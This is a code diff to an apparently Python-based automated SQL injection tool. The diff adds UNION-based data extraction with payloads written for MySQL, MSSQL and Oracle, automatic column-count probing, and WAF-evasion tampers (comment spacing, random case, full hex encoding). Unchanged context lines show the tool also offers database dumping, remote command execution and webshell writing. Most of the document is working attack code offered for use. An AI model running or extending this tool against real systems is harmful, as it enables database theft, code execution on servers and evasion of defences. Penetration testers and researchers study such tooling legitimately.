@@ -11,9 +11,11 @@ techniques, choosing automatically:
     2. DBMS        : fingerprints the backend automatically
                      (PostgreSQL, MySQL, MSSQL, Oracle).
     3. TECHNIQUE   : picks the fastest available, preferring
-                       error-based  (one-shot dump via a forced DB error)
+                       union-based  (reflected, ~1 request/value)
+                     > error-based  (one-shot dump via a forced DB error)
                      > boolean-based (auto-calibrated TRUE/FALSE signal)
                      > time-based    (sleep oracle, last resort).
+  Optional WAF evasion via --tamper (space2comment, randomcase, charencode).
 
   PHASE 2 - EXTRACTION
     - error-based : leaks the whole value in ONE request (chunked if the DBMS
@@ -55,7 +57,7 @@ EXAMPLES
       --query "SELECT version()"
 ----------------------------------------------------------------------
 """
-import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading
+import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading, random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import requests
 import urllib3
@@ -65,6 +67,8 @@ PROBE = "Prb0"                     # constant used to detect error reflection
 TRUE_COND, FALSE_COND = "1=1", "1=2"
 RCE_SHELL = "\x00rce-shell"        # sentinel: --rce with no command -> interactive shell
 RCE_TABLE = "bf_rce"              # scratch table that captures command output
+UMARK = "bfUc"                   # UNION column-reflection probe
+ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
 
 class RequestError(Exception):
@@ -118,6 +122,11 @@ class Dbms:
     def webshell_write(self, path, content): return None   # statement that writes the file
     def file_check(self, path, marker):    # scalar query: 'OK' if file exists and contains marker
         return None
+
+    # --- UNION-based (reflected) extraction ---
+    union_from = ""                   # extra FROM a UNION SELECT needs (Oracle: " FROM dual")
+    def union_wrap(self, qexpr, left, right):     # wrap a scalar: left || value || right
+        return f"'{left}'||({qexpr})||'{right}'"
 
     # --- schema mapping queries (override per DBMS) ---
     list_sep = ","
@@ -198,6 +207,8 @@ class MySQL(Dbms):
         return (f"SELECT CASE WHEN LOAD_FILE({self.quote_str(path)}) LIKE {like} "
                 f"THEN 'OK' ELSE 'NO' END")
     def quote_ident(self, name): return "`" + name.replace("`", "``") + "`"
+    def union_wrap(self, qexpr, left, right):
+        return f"concat('{left}',({qexpr}),'{right}')"
     def q_current_db(self): return "SELECT database()"
     def q_tables(self):
         return ("SELECT group_concat(table_name) FROM information_schema.tables "
@@ -219,6 +230,8 @@ class MSSQL(Dbms):
     def substr(self, e, p): return f"substring(({e}),{p},1)"
     def code_expr(self, ch): return f"unicode({ch})"   # UTF-16 code unit
     def quote_ident(self, name): return "[" + name.replace("]", "]]") + "]"
+    def union_wrap(self, qexpr, left, right):
+        return f"'{left}'+CAST(({qexpr}) AS varchar(8000))+'{right}'"
     def sleep_stacked(self, cond, sleep):
         return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
     def error_expr(self, inner):
@@ -255,6 +268,7 @@ class Oracle(Dbms):
     stacked = False
     fingerprints = ["(SELECT 1 FROM v$version WHERE rownum=1)=1"]
     # boolean works great; time/error left None (handled via boolean fallback)
+    union_from = " FROM dual"         # Oracle UNION SELECT needs a FROM
     def quote_ident(self, name):
         # Oracle folds unquoted idents to upper; keep them bare but whitelist to avoid injection
         if not re.match(r"^[A-Za-z0-9_$#]+$", name):
@@ -297,6 +311,41 @@ STACKED_CONTEXT = Ctx("stacked", "'", "", "stacked")
 
 def boolean_payload(ctx, cond, comment):
     return f"{ctx.close}{ctx.logic}({cond}){comment}"
+
+
+# ===========================================================================
+# WAF tamper layer. Tampers transform the payload BEFORE URL-encoding. The
+# string ones are quote-aware: they never touch text inside '...' literals, so
+# our markers / webshells / identifiers stay intact. 'charencode' is handled in
+# the encoder (it replaces URL-encoding with full %XX).
+# ===========================================================================
+def _apply_outside_quotes(s, fn):
+    out, seg, in_q, i = [], [], False, 0
+    while i < len(s):
+        ch = s[i]
+        if ch == "'" and in_q and i + 1 < len(s) and s[i + 1] == "'":
+            out.append("''"); i += 2; continue       # escaped quote inside a literal
+        if ch == "'":
+            if not in_q:
+                out.append(fn("".join(seg))); seg = []
+            out.append("'"); in_q = not in_q; i += 1; continue
+        if in_q:
+            out.append(ch)
+        else:
+            seg.append(ch)
+        i += 1
+    out.append(fn("".join(seg)))
+    return "".join(out)
+
+def _t_space2comment(s):
+    return _apply_outside_quotes(s, lambda seg: seg.replace(" ", "/**/"))
+
+def _t_randomcase(s):
+    flip = lambda seg: "".join(random.choice((c.upper, c.lower))() if c.isalpha() else c for c in seg)
+    return _apply_outside_quotes(s, flip)
+
+STRING_TAMPERS = {"space2comment": _t_space2comment, "randomcase": _t_randomcase}
+ALL_TAMPERS = set(STRING_TAMPERS) | {"charencode"}
 
 
 # ===========================================================================
@@ -353,6 +402,9 @@ class Target:
             urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
         self.session = requests.Session()    # keep-alive + cookie persistence
         self._baseline = None
+        names = [t.strip() for t in (getattr(a, "tamper", None) or "").split(",") if t.strip()]
+        self._tampers = [STRING_TAMPERS[n] for n in names if n in STRING_TAMPERS]
+        self._charencode = "charencode" in names
 
     def baseline(self, a):
         """Median + stdev of normal (no-sleep) response latency, sampled once."""
@@ -364,14 +416,18 @@ class Target:
             self._baseline = (med, sd)
         return self._baseline
 
-    def _enc(self, p):
+    def _transform(self, p):
+        for fn in self._tampers:                      # quote-aware SQL tampers
+            p = fn(p)
+        if self._charencode:                          # full %XX encoding (WAF bypass)
+            return "".join("%%%02X" % b for b in p.encode())
         return urllib.parse.quote_plus(p) if self.a.encode else p
 
     def _put(self, s, payload):
         return s.replace(self.a.marker, payload) if s else s
 
     def send(self, payload):
-        payload = self._enc(payload)
+        payload = self._transform(payload)
         url = self._put(self.url, payload)
         data = self._put(self.data, payload)
         headers = {k: self._put(v, payload) for k, v in self.headers.items()}
@@ -584,10 +640,36 @@ def find_error(target, dbms, a, contexts):
     return None
 
 
+def find_union(target, a, dbms):
+    """Detect a reflected UNION injection: discover column count + which column echoes."""
+    prefixes = [("' AND 1=2 UNION SELECT ", "string"), ("-1 UNION SELECT ", "numeric")]
+    for prefix, label in prefixes:
+        for n in range(1, a.union_cols + 1):
+            marks = [f"{UMARK}{i}z" for i in range(1, n + 1)]
+            cols = ",".join(f"'{mk}'" for mk in marks)
+            text = target.send(f"{prefix}{cols}{dbms.union_from}{dbms.comment}").text
+            for i, mk in enumerate(marks, 1):
+                if mk in text:
+                    print(f"[+] UNION reflects: {label} context, {n} columns, column {i}")
+                    return (prefix, n, i)
+    return None
+
+
+def union_read(target, det, query):
+    """One-request reflected read of a scalar via the detected UNION column."""
+    prefix, n, col = det.union
+    cols = [det.dbms.union_wrap(query, ULEFT, URIGHT) if j == col else "NULL"
+            for j in range(1, n + 1)]
+    text = target.send(f"{prefix}{','.join(cols)}{det.dbms.union_from}{det.dbms.comment}").text
+    m = re.search(re.escape(ULEFT) + "(.*?)" + re.escape(URIGHT), text, re.S)
+    return m.group(1) if m else None
+
+
 class Detection:
-    def __init__(self, technique, dbms, ctx, oracle=None, classifier=None, signal="", err_ctx=None):
+    def __init__(self, technique, dbms, ctx, oracle=None, classifier=None, signal="", err_ctx=None, union=None):
         self.technique, self.dbms, self.ctx = technique, dbms, ctx
         self.oracle, self.classifier, self.signal, self.err_ctx = oracle, classifier, signal, err_ctx
+        self.union = union            # (prefix, n_cols, reflected_col) for union-based
 
 
 def detect(target, a):
@@ -621,7 +703,14 @@ def detect(target, a):
     if not dbms:
         return None
 
-    # prefer error-based (one-shot) unless forced away
+    # prefer UNION (reflected, ~1 request/value) when available
+    if not (a.force_boolean or a.force_time) and not a.no_union:
+        u = find_union(target, a, dbms)
+        if u:
+            return Detection("union-based", dbms, bool_ctx or time_ctx or BOOL_CONTEXTS[0],
+                             union=u)
+
+    # then error-based (one-shot) unless forced away
     if not (a.force_boolean or a.force_time) and not a.no_error:
         err_ctx = find_error(target, dbms, a, contexts)
         if err_ctx:
@@ -750,6 +839,8 @@ def _bin_length(oracle, query, cap):
 
 def read_scalar(target, det, a, query, cap=None):
     """Extract one scalar with the detected technique (no checkpoint; for map/dump)."""
+    if det.technique == "union-based":
+        return union_read(target, det, query)
     if det.technique == "error-based":
         return extract_error(target, det.dbms, det.ctx, a, query)
     o = det.oracle
@@ -965,6 +1056,10 @@ def main():
     det.add_argument("--force-boolean", action="store_true")
     det.add_argument("--force-time", action="store_true")
     det.add_argument("--no-error", action="store_true", help="don't use error-based even if available")
+    det.add_argument("--no-union", action="store_true", help="don't try UNION (reflected) extraction")
+    det.add_argument("--union-cols", type=int, default=12, dest="union_cols",
+                     help="max columns to probe for UNION (default 12)")
+    det.add_argument("--tamper", help="WAF evasion, comma-separated: space2comment, randomcase, charencode")
     det.add_argument("--allow-or", action="store_true", help="include risky OR contexts (may change app state)")
     det.add_argument("--true-match", help="string only in a TRUE response (overrides calibration)")
     det.add_argument("--false-match", help="string only in a FALSE response")
@@ -981,12 +1076,12 @@ def main():
                      help="transport-level retries on connection errors (with backoff)")
     tun.add_argument("--threads", type=int, default=1, help="parallel workers for boolean extraction")
     tun.add_argument("--maxlen", type=int, default=4096, help="max value length / length-probe cap")
-    tun.add_argument("--ascii", dest="ascii_only", action="store_true",
-                     help="ASCII-only target: skip the Unicode probe (1 fewer request/char)")
     tun.add_argument("--charset", help="restrict extraction to a known alphabet for speed: "
                      "a preset (hex, HEX, digits, alnum) or a literal set of characters")
     tun.add_argument("--timeout", type=float, default=30.0,
                      help="HTTP timeout seconds (auto-raised above --sleep for time-based)")
+    tun.add_argument("--ascii", dest="ascii_only", action="store_true",
+                     help="ASCII-only target: skip the Unicode probe (1 fewer request/char)")
     tun.add_argument("--proxy")
     tun.add_argument("--insecure", action="store_true", help="skip TLS verification (and silence its warning)")
 
@@ -1002,6 +1097,10 @@ def main():
     actions = sum(x for x in (a.query is not None, a.dump is not None, a.rce is not None, a.webshell))
     if actions > 1:
         ap.error("choose only one of --query / --dump / --rce / --webshell")
+    if a.tamper:
+        bad = [t.strip() for t in a.tamper.split(",") if t.strip() and t.strip() not in ALL_TAMPERS]
+        if bad:
+            ap.error(f"unknown --tamper: {', '.join(bad)} (available: {', '.join(sorted(ALL_TAMPERS))})")
     if a.charset:                       # resolve preset/custom -> sorted unique alphabet
         presets = {"hex": "0123456789abcdef", "HEX": "0123456789ABCDEF",
                    "digits": "0123456789",
@@ -1039,20 +1138,21 @@ def main():
         print(f"\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
         return
 
-    # ---- --query : single scalar with resume ----
+    # ---- --query : single scalar ----
     print("\n=== EXTRACTION ===")
-    sig = job_signature(a, det, target)
-    state_path = a.state or f".blindfold-{sig}.json"
     print(f"[*] query : {a.query}")
 
-    if det.technique == "error-based":
-        val = extract_error(target, det.dbms, det.ctx, a)
+    if det.technique in ("union-based", "error-based"):
+        val = union_read(target, det, a.query) if det.technique == "union-based" \
+            else extract_error(target, det.dbms, det.ctx, a)
         if not val:
-            print("[!] error-based dump returned nothing; re-run with --no-error to fall back.")
+            print(f"[!] {det.technique} returned nothing; try --no-union/--no-error to fall back.")
             sys.exit(1)
-        print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  (error-based, {det.dbms.name})")
+        print(f"\n[+] RESULT: {val}\n[*] total requests: {target.count}  ({det.technique}, {det.dbms.name})")
         return
 
+    sig = job_signature(a, det, target)
+    state_path = a.state or f".blindfold-{sig}.json"
     print(f"[*] state : {state_path}")
     value, length = "", None
     if not a.fresh:
